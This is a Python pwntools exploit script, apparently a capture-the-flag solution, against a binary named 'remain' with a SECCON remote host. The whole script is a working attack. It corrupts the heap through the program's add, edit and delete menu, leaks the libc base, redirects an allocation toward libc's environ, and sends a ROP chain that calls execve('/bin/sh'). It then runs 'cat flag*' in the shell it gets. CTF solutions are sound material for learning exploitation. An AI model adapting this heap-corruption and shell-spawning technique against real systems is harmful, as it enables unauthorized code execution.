#!/usr/bin/env python
from pwn import *

def add(content):
    s.sendlineafter('> ', '1')
    s.sendafter('> ', content)

def edit(index, content):
    s.sendlineafter('> ', '2')
    s.sendlineafter('> ', str(index))
    s.sendafter('> ', content)

def delete(index):
    s.sendlineafter('> ', '3')
    s.sendlineafter('> ', str(index))

def quit():
    s.sendlineafter('> ', '0')

libc = ELF('./libc.so.6')

while(True):
    if len(sys.argv) == 1:
        s = process(['./ld.so', './remain'], env = {'LD_PRELOAD': './libc.so.6'})
    else:
        s = remote('remain.chal.seccon.jp', 27384)

    try:
        add('A') # 0
        add('A') # 1
        delete(0)
        delete(1)
        edit(1, '\xa8\xf0')
        add('A') # 2
        add('A') # 3
        delete(0)
        delete(1)
        edit(3, '\xe0\xf7')
        add(p64(0) + p64(0x21) + p64(0) * 3 + p64(0x21)) # 4
        delete(0)
        edit(3, '\xe0')
        add('A' * 8 + p64(0x501)) # 5
        delete(1)
        delete(0)
        edit(3, '\xf0')
        edit(1, '\xc8\xe6')
        add('A') # 6
        add('\xf0') # 7

        if s.recv(5) != '\n\0\0\0\0':
            s.close()
            continue
        libc_base = u64(s.recv(8)) - 0x3b77e0
        log.info('libc base: %#x' % libc_base)

        edit(3, '\0' * 6)
        edit(5, 'A' * 8 + '\x51\x00')
        delete(0)
        delete(1)
        edit(3, p64(libc_base + libc.symbols['environ'])[:6])
        add('\x50') # 8
        edit(3, '\x08')

        pop_rdi = libc_base + 0x21a32
        pop_rsi = libc_base + 0x22402
        pop_rdx = libc_base + 0x1b9a
        pop_rax = libc_base + 0x39097
        syscall = libc_base + 0x39259

        payload = ''
        payload += p64(pop_rdi) + p64(libc_base + libc.search('/bin/sh').next())
        payload += p64(pop_rsi) + p64(0)
        payload += p64(pop_rdx) + p64(0)
        payload += p64(pop_rax) + p64(0x3b)
        payload += p64(syscall)
        add(payload[:0x47]) # 9
        quit()
        s.recvuntil('Bye!\n')
        s.sendline('cat flag*')

        s.interactive()
    except Exception:
        s.close()
